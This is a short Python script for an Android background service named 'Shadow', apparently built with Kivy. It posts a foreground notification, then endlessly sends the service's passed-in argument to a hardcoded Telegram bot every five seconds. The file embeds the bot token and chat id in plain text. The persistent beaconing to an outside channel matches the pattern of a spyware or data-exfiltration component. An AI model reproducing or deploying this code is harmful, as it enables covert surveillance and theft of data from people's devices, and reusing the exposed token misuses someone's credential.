import time,requests,os

def create_notification():
    try:
        from jnius import autoclass
        
        PythonService = autoclass('org.kivy.android.PythonService')
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        NotificationChannel = autoclass('android.app.NotificationChannel')
        NotificationManager = autoclass('android.app.NotificationManager')
        Context = autoclass('android.content.Context')
        
        service = PythonService.mService
        channel_id = 'shadow_channel'
        
        # Create channel (Android 8+)
        channel = NotificationChannel(
            channel_id,
            'Shadow Service',
            NotificationManager.IMPORTANCE_LOW
        )
        manager = service.getSystemService(Context.NOTIFICATION_SERVICE)
        manager.createNotificationChannel(channel)
        
        # Build notification
        builder = NotificationBuilder(service, channel_id)
        builder.setContentTitle('Shadow')
        builder.setContentText('Shadow is running...')
        builder.setSmallIcon(service.getApplicationInfo().icon)
        
        notification = builder.build()
        service.startForeground(1, notification)
        
    except Exception as e:
        with open('/sdcard/shadow_log.txt', 'w') as f:
            f.write(f'notification error: {str(e)}')

create_notification()

while True:
    requests.post("https://api.telegram.org/bot8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI/sendMessage", data={'chat_id':'7589082187','text':os.environ.get('PYTHON_SERVICE_ARGUMENT','No argv Found')})
    time.sleep(5)